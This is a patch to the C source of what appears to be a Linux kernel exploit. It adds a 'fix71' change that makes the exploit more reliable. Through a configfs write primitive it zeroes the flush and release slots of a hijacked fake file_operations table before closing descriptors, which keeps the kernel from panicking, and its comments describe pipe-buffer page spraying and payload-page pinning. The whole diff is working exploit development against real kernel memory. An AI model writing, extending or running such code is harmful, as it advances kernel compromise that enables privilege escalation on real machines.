@@ -846,7 +846,35 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     }
   }
   free(wave_pids);
-  close(conv_fd);
+  /* fix71 (2026-10-25): conv_fd is a dup of the hijacked probe fd, so
+   * close() here goes through filp_close -> f_op->flush on the FAKE table.
+   * Three consecutive rounds (redo8/9/10) panicked at exactly this point,
+   * at the same win+3~5s moment prepare finishes:
+   *   redo8/9  pc=0x0          (flush residue raced init_on_alloc zeroing)
+   *   redo10   pc=0x7cffffffde10f539 / SP-PC alignment -- flush slot holds
+   *            a misaligned text-pointer residue even though the page is
+   *            ALIVE (cfgfs rd=8, win dead=0, cfi verify ioctl/open/read
+   *            all correct) -- i.e. flush/release were polluted after
+   *            put/refresh zeroed them, and no other verifier reads 0x78.
+   * The page is alive right now (convert just ran cfgfs reads through
+   * conv_fd), so force both slots to 0 through the cfgfs write channel
+   * and only then close.  If the write fails the page is dead and the
+   * close would jump to garbage -- leak the fd instead (the abort path
+   * never returns here anyway). */
+  {
+    uint64_t z = 0;
+    ssize_t wf = configfs_write_once(conv_fd,
+                                     fops_table_base() + FOPS_FLUSH_OFF, &z, 8);
+    ssize_t wr = configfs_write_once(conv_fd,
+                                     fops_table_base() + FOPS_RELEASE_OFF, &z, 8);
+    if (wf == 8 && wr == 8) {
+      close(conv_fd);
+    } else {
+      pr_warning("fix71: flush sanitize failed wf=%zd wr=%zd; leaking "
+                 "conv_fd=%d instead of filp_close on garbage flush\n",
+                 wf, wr, conv_fd);
+    }
+  }
 
   pin_to_core(CORE);
   /* fix63: skb_sv deliberately NOT closed -- the payload page must stay
@@ -903,6 +931,30 @@ uintptr_t prepare_pipe_buffer_page(void) {
      * (opened below) and 0/1/2 survive -- and fix63's payload socketpair,
      * which the sweep now spares: it is the pin keeping the fake table's
      * page alive for the parent's cfgfs ops. */
+    /* fix71: this sweep closes the inherited fake-fops fds (probe/conv/
+     * route) -- filp_close reads f_op->flush from the fake table, which
+     * redo10 proved can hold misaligned garbage even on a live page.
+     * Sanitize flush/release through cfgfs FIRST; if the page is already
+     * dead the write fails and we must NOT sweep (close on a dead page
+     * jumps to residue), so the child keeps its fds and sleeps -- the
+     * parent's abort never SIGKILLs it because pipe_prepare_child stays
+     * set... actually it does on reset; accept that residual risk (dead-
+     * page exit family, AGENTS fd-hold) and only guarantee the live-page
+     * path this sweep was designed for. */
+    if (g_fops_probe_fd >= 0) {
+      uint64_t z = 0;
+      ssize_t wf = configfs_write_once(g_fops_probe_fd,
+                                       fops_table_base() + FOPS_FLUSH_OFF, &z, 8);
+      ssize_t wr = configfs_write_once(g_fops_probe_fd,
+                                       fops_table_base() + FOPS_RELEASE_OFF, &z, 8);
+      if (wf != 8 || wr != 8) {
+        pr_warning("fix71: pre-sweep flush sanitize failed wf=%zd wr=%zd; "
+                   "skipping fd sweep to avoid filp_close on garbage\n", wf, wr);
+        for (;;) {
+          sleep(60);
+        }
+      }
+    }
     for (int fd = 3; fd < 4096; fd++) {
       if (fd == g_payload_hold_sv[0] || fd == g_payload_hold_sv[1]) {
         continue;
